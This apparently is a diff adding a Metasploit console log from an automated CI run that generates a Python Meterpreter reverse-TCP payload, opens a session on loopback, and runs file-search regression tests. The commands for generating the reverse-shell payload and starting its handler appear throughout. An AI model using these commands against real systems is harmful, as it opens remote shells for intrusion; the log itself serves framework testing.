@@ -1,0 +1,42 @@
+use python/meterpreter_reverse_tcp
+irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/pythonmeterpreter_reverse_tcp_session_tlv_logging20231026-5512-jfjxl1txt
+msf6 payload(python/meterpreter_reverse_tcp) > msf6 payload(python/meterpreter_reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/pythonmeterpreter_reverse_tcp_session_tlv_logging20231026-5512-jfjxl1txt
+msf6 payload(python/meterpreter_reverse_tcp) > generate -o D:/a/_temp/child-process-rb-python-meterpreter-reverse-tcp20231026-5512-1j9w9g.py -f raw AutoVerifySessionTimeout=30 lport=6005 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/pythonmeterpreter_reverse_tcp_debug_log20231026-5512-4t6y0ztxt MeterpreterTryToFork=false PythonMeterpreterDebug=true
+[*] Writing 24924 bytes to D:/a/_temp/child-process-rb-python-meterpreter-reverse-tcp20231026-5512-1j9w9g.py...
+msf6 payload(python/meterpreter_reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 4
+msf6 payload(python/meterpreter_reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6005 
+[*] Meterpreter session 5 opened (127.0.0.1:6005 -> 127.0.0.1:50001) at 2023-10-26 19:04:00 +0000
+use test/search
+msf6 post(test/search) > run session=5 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to tmp: C:\Users\RUNNER~1\AppData\Local\Temp
+[*] Setup: Creating clean directory
+[*] Creating directory meterpreter-test-dir-tuwzbsam
+[*] meterpreter-test-dir-tuwzbsam created
+[*] Setup: Now in C:/Users/RUNNER~1/AppData/Local/Temp/meterpreter-test-dir-tuwzbsam
+[*] Source File Name: meterpreter-test-dyxeusjh.txt
+[*] Running against session 5
+[*] Session type is meterpreter and platform is windows
+[*] Starting search date tests
+[+] should search with dates for files
+[+] should search with dates ignores new files
+[+] should search with dates ignores old files
+[*] Session does not support setting the modified date, skipping exact date tests
+[*] Starting search tests
+[+] should search for new files
+[+] should search recursively for files
+[+] should search with globs for files
+[+] should search with globs ignoring files
+[*] Testing complete in 0.15 seconds
+[*] Passed: 7; Failed: 0; Skipped: 0
+[*] Cleanup: changing working directory back to D:/a/metasploit-framework/metasploit-framework
+[*] Post module execution completed
+msf6 post(test/search) > sessions -K
+jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 5 closed.
+msf6 post(test/search) > Stopping all jobs...
+msf6 post(test/search) > 
